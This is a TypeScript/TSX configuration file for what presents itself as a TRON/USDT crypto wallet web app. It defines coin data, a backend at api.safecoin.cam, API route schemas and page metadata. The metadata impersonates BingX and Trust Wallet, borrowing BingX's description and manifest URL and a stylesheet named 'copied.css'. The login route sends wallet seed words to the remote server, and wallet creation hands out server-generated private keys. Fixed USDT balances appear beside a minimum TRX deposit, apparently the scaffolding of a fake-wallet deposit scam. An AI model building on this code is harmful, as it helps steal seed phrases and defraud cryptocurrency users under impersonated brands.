type SupportedCoinType = {
	"id": number,
	"name": string,
	"symbol": string,
	"icon": string,
	network: undefined | number,
	isDex: boolean,
	display: boolean | undefined
}

declare global {
	var SupportedCoins: SupportedCoinType[]
}

export let SupportedCoins: SupportedCoinType[] = global.SupportedCoins || [
	{
		"id": 1958,
		"name": "TRON",
		"symbol": "TRX",
		"icon": "https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png",
		network: undefined,
		isDex: false
	}
];
global.SupportedCoins ||= SupportedCoins;

export function updateSupportCoin(n: typeof SupportedCoins) {
	SupportedCoins = n;
	global.SupportedCoins = n;
}

export const devMode = process.env['NODE_ENV'] === "development";
export const BACKEND_URL = new URL(process.env['BACKEND_URL'] || "https://api.safecoin.cam");

export const ApiRoutes = {
	"POST:/wallet/login/": {
		auth: false,
		body: {
			"words": ""
		},
		json: {
			"ok": true,
			"address": "",
			"usdt_balance": 100,
			"trx_balance": 0,
			"access": ""
		}
	},
	"GET:/wallet/create/": {
		auth: false,
		body: undefined,
		json: {
			"ok": true,
			"passphrases": ["aim"],
			"private_key": "",
			"address": "",
			"usdt_balance": 200,
			"minimum_trx_amount": 30
		}
	},
	"GET:/wallet/info/": {
		auth: true,
		body: undefined,
		json: {
			"ok": true,
			"address": "",
			"trx_balance": 0,
			"usdt_balance": 100,
			"passphrases": ["solid"],
			"minimum_trx_amount": 15,
			"id": 13,
			"transactions": [
				{
					"amount": 0,
					"hash": "",
					"url": ""
				}
			]
		}
	},
	"GET:/wallet/qrcode/": {
		auth: true,
		body: undefined,
		json: {
			"ok": true,
			"url": "",
			"address": "",
			"id": 0
		}
	}
} as const;


export const AppHeaders = (
	<>
		<link rel='stylesheet' href='/copied.css'/>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
		<meta httpEquiv="Content-Type" content="text/html; charset=UTF-8"/>
		<meta name="viewport"
			 content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
		<meta name="apple-mobile-web-app-capable" content="BingX, by iTzUnity"/>
		<meta name="format-detection" content="telephone=yes"/>
		<meta httpEquiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
		<meta name="apple-mobile-web-app-capable" content="trust wallet"/>
		<meta name="apple-mobile-web-app-status-bar-style" content="#1b1b1b"/>
		<meta name="theme-color" content="#1b1b1b"/>
		<meta name="description"
			 content="Crypto Trading Made Easy. Buy and sell with BingX, a secure platform that makes it easy to trade and store cryptocurrency."/>
		<meta name="keywords" content="Ethereum Perpetual Futures, Safe Trading, Digital Assets"/>
		<meta name="apple-mobile-web-app-capable" content="yes"/>
		<link rel="manifest" href="https://m.bingx.com/json/pwa.manifest100.json"/>
	</>
)
